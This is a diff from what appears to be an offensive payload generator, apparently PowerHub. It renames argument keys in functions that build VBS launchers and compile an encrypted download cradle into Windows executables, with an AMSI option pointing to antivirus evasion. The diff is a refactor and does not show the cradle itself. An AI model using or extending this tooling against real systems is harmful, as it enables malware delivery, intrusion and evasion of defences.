@@ -24,19 +24,19 @@ def load_template(filename, **kwargs):
 
 def create_filename(args):
     result = 'powerhub'
-    result += '-' + args['GroupLauncher']
-    result += '-' + args['GroupAmsi']
-    result += '-' + args['GroupTransport']
-    if args['GroupClipExec'] != 'none':
-        result += '-' + args['GroupClipExec']
-    if args['GroupLauncher'] in [
+    result += '-' + args['Launcher']
+    result += '-' + args['Amsi']
+    result += '-' + args['Transport']
+    if args['ClipExec'] != 'none':
+        result += '-' + args['ClipExec']
+    if args['Launcher'] in [
         'mingw32-32bit',
         'mingw32-64bit',
         'dotnetexe-32bit',
         'dotnetexe-64bit',
     ]:
         result += '.exe'
-    elif args['GroupLauncher'] == 'vbs':
+    elif args['Launcher'] == 'vbs':
         result += ".vbs"
     return result
 
@@ -52,13 +52,13 @@ def create_payload(args):
         #  "rundll32": create_exe,
         #  "installutil": create_exe,
     }
-    return payload_generators[args['GroupLauncher']](args)
+    return payload_generators[args['Launcher']](args)
 
 
 def create_vbs(args):
     filename = create_filename(args)
     args = dict(args)  # convert from immutable dict
-    args['GroupLauncher'] = 'cmd_enc'
+    args['Launcher'] = 'cmd_enc'
     cmd = build_cradle(args).replace('\n', '')
     cmd = ('CreateObject("WScript.Shell").' +
            'exec("%s")') % cmd
@@ -81,7 +81,7 @@ def create_docx(args):
 def compile_source(args, source_file, compile_cmd, formatter):
     filename = create_filename(args)
     args = dict(args)  # convert from immutable dict
-    args['GroupLauncher'] = 'cmd_enc'
+    args['Launcher'] = 'cmd_enc'
     cmd = build_cradle(args)
     size = len(cmd)
     key = generate_random_key(16)
@@ -116,7 +116,7 @@ def compile_source(args, source_file, compile_cmd, formatter):
 
 
 def create_exe(args):
-    if args['GroupLauncher'] == 'mingw32-32bit':
+    if args['Launcher'] == 'mingw32-32bit':
         mingw = 'i686-w64-mingw32-gcc'
     else:
         mingw = 'x86_64-w64-mingw32-gcc'
@@ -130,7 +130,7 @@ def create_exe(args):
 
 
 def create_dotnet(args):
-    if args['GroupLauncher'] == 'dotnetexe-32bit':
+    if args['Launcher'] == 'dotnetexe-32bit':
         platform = "x86"
     else:
         platform = "x64"
